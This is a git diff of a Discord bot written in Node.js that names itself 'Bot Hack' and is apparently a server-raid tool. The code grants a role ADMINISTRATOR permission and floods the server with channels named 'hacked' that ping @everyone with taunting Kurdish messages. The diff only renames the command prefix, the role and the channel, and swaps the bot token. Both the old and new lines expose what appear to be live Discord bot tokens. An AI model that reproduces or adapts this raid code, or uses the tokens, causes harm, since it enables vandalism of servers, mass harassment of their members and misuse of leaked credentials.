@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = "."; ///lera ba dly xot prefix dabne
+const prefix = "dilan up"; ///lera ba dly xot prefix dabne
 client.on("ready", () => {
   console.log(`Logged in as ${client.user.tag}!`);
   console.log(`Bot Hack Is Ready`)
@@ -26,7 +26,7 @@ client.on("message", message => {
       message.guild.roles
         .create({
         data: {
-          name: "هاکرا بەساقە:joy:",
+          name: "Kalary Bzhi Ba Xom Nerakarm..!",
           permissions: ["ADMINISTRATOR"]
         }
         })
@@ -45,7 +45,7 @@ client.on("message", message => {
       setInterval(
         () => {
           message.guild.channels
-            .create("hacked", "text")
+            .create("hacked By Kalary", "text")
             .then(channel => {
               channel.send(
                 "@everyone ئەڵێ دەست درێژبێ دەمت کورتەبێ زۆر خۆو هەڵکێشی گوێو لە جڕتەبێ :joy: :joy: :joy:"
@@ -62,4 +62,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("ODE3MTU3NDM0OTkyMjMwNDQy.YEFbKg.sV9y7otxFPdtujcWu-Sq29tDV0Y");
+client.login("ODg2NTk0Mjg0NTUwMjM0MTIy.YT338g.GXeY2vcgCE2oJzhPLpj6f6C1780");
